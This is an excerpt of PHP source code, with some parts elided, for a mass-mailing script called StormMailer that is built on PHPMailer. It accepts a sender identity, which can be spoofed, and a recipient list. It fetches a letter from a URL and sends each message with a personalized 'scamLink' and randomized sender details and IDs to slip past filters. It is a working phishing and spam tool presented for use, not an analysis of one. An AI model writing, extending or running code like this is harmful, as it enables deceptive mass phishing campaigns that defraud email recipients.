...
/* mailer */
if($_POST['act']=="mailer") {
    $senderEmail = stormTrim($_POST['senderEmail']);
    $senderEmail = str_replace("[RANDNM]", rand(1111,9999), $senderEmail);
    $senderEmail = str_replace("[RANDTX]", randChar(3), $senderEmail);
    $senderName = stormTrim($_POST['senderName']);
    $replyTo = stormTrim($_POST['replyTo']);
    $replyTo = str_replace("[RANDNM]", rand(1111,9999), $replyTo);
    $replyTo = str_replace("[RANDTX]", randChar(3), $replyTo);
    $subject = stormTrim($_POST['subject']);
    $subject = stripslashes($subject);
    $emailList = stormTrim($_POST['emailList']);
    $messageType = stormTrim($_POST['messageType']);
    $messageLetter = stormTrim(getContent($_POST['messageLetter']));
	if($messageLetter !== "ERROR") {
		...
		$result['status'] = "ERROR";
		$result['email'] = $email;
		$result['msg'] = "Failed Get Letter!";
		$result['client_ip'] = $_SERVER['REMOTE_ADDR'];
		$result['time'] = date("D M j G:i:s T Y");
	...
	if($_POST['encode']=='y') {
        ...
        $senderName = preg_replace('/([^a-z ])/ie', 'sprintf("=%02x",ord(StripSlashes("\\1")))', $senderName);
        $senderName = str_replace(' ', '=20', $senderName);
        $senderName= "=?utf-8?Q?$senderName?=";
	}
	$scamLink = stormTrim($_POST['link']);
    $scamLink = str_replace("EMAIL", strtolower($emailList), $scamLink);
    $scamLink = str_replace("XXX", randChar(3), $scamLink);
    $scamLink = str_replace("YYY", randChar(3), $scamLink);
    $scamLink = str_replace("ZZZ", randChar(3), $scamLink);
}
if($messageType==2){
    $plain="checked";
} else {
...
function stormClear($text,$email){
    $emailuser = preg_replace('/([^@]*).*/', '$1', $email);	
    $text = str_replace("##link##", $scamLink, $text);
    $text = str_replace("##time##", date("m/d/Y h:i:s a", time()), $text);
    $text = str_replace("##email##", $email, $text);
    $text = str_replace("##emailuser##", $emailuser, $text);
    $text = str_replace("##useragent##", random_uagent(), $text);
    $text = str_replace("##randomid##", rand(111,999)."-".rand(1111111,9999999)."-".rand(1111111,9999999), $text);
...
function stormTrim($string){
	return stripslashes(ltrim(rtrim($string)));
}
function getContent($link) {
	$get = file_get_contents($link) or die(curlContent($link));
	return $get;
}
function curlContent($link) {
	$ch = curl_init();
    ...
    public function createHeader()
    {
        ...
        if ($this->XMailer == '') {
            $result .= $this->headerLine(
                'X-Mailer',
                'StormMailer PHPMailer 2.7 (stormmailer.github.io)'
            );
        } else {
...
if($_POST['act'] == "mailer") {
    ...
    foreach ($maillist as $email) {
        if(!stormMailCheck($email)) {
            ...
            $mail = new PHPMailer;
            $mail->setFrom(stormClear($senderEmail,$email),stormClear($senderName,$email));
            $mail->addReplyTo(stormClear($replyTo,$email));
            $mail->addAddress($email);
            $mail->Subject = stormClear($subject,$email);
            $mail->Body = stormClear($messageLetter,$email);
            $mail->CharSet = "UTF-8";
            ...
            if (!$mail->send()) {
				...
				$result['status'] = "OK";
				$result['email'] = $email;
				$result['msg'] = "Message send successfully!";
				$result['client_ip'] = $_SERVER['REMOTE_ADDR'];
				$result['time'] = date("D M j G:i:s T Y");
                echo json_encode($result);
            }
	...
	$result['error_code'] = -1;
	$result['status'] = "wrong";
	$result['msg'] = "Your parameter is wrong!";
	echo json_encode($result);
}
?>
